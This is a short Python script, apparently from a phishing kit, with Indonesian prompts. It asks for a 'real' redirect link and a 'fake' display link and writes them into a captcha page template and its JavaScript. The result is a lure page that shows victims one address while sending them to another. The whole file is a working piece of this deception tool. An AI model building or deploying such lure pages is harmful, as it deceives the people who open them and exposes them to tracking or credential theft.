#!/usr/bin/env python3
import os
import utils

a = "\033[1;30m"
m = "\033[1;31m"
p = "\033[1;37m"
r = "\033[0m"

real_forward = os.getenv('REDIRECT')
fake_forward = os.getenv('DISPLAY_URL')

if real_forward is None:
    real_forward = input(f'\n{a}[{m}?{a}] {p}Masukkan Link Tujuan Asli {m}:{a} ')
else:
    utils.print(f'{a}[{m}?{a}] {p}Link Tujuan Asli{m} :{a} '+real_forward)

if fake_forward is None:
    fake_forward = input(f'{a}[{m}?{a}] {p}Masukkan Link Palsu{m} :{a} ')
else:
    utils.print(f'{a}[{m}?{a}] {p}Link Palsu {m}:{a} '+fake_forward)

with open('template/captcha/js/main_temp.js', 'r') as location_temp:
    js_file = location_temp.read()
    updated_js_raw = js_file.replace('REDIRECT_URL', real_forward)

with open('template/captcha/js/main.js', 'w') as updated_js:
    updated_js.write(updated_js_raw)

with open('template/captcha/index_temp.html', 'r') as temp_index:
    temp_index_data = temp_index.read()
    if os.getenv("DEBUG_HTTP"):
        temp_index_data = temp_index_data.replace('window.location = "https:" + restOfUrl;', '')
    upd_temp_index_raw = temp_index_data.replace('FAKE_REDIRECT_URL', fake_forward)

with open('template/captcha/index.html', 'w') as updated_index:
    updated_index.write(upd_temp_index_raw)
